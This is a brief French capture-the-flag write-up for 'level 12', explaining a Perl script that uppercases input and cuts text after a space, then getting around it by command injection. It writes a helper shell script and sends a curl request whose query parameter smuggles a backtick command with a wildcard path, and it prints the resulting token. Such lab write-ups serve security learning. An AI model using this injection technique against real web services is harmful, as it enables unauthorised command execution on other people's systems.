#LEVEL 12

script perl;
deux fonctions;

L'opérateur =~ applique la recherche à la chaîne placée à gauche et return TRUE si la regex correspond ou FALSE.
@variable pour un tableau.
sub = subroutines/sous programme.

$_[0]_ pour le premier argument envoyer, et ainsi de suite c'est un tab;

n appelle t(x, y) {
	on stocke x dans xx;
	on stocke y dans nn;

	la premiere regex transforme les minuscule en majuscule;
	supprime tout ce qui suit un espace.

}

a l'executio de egrep on peut en profiter pour y injecter un script a executer comme dans l'exo precedent.
la fonction transforme en majuscule puis supprime les espaces il est donc complique d'envoyer la commande directement
on va plutot lui envoyer lui faire lancer un script qui contient notre commande.

grace a une wildcard et un nom unique on va pouvoir acceder a notre script

~$ cat tmp/SCRIPT
#!/bin/sh
getflag > /tmp/flag12

on lance ensuite notre requete curl avec le script en parametre.

~$ curl ip.machine.virtuelle:4646?x='`/*/SCRIPT`'
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
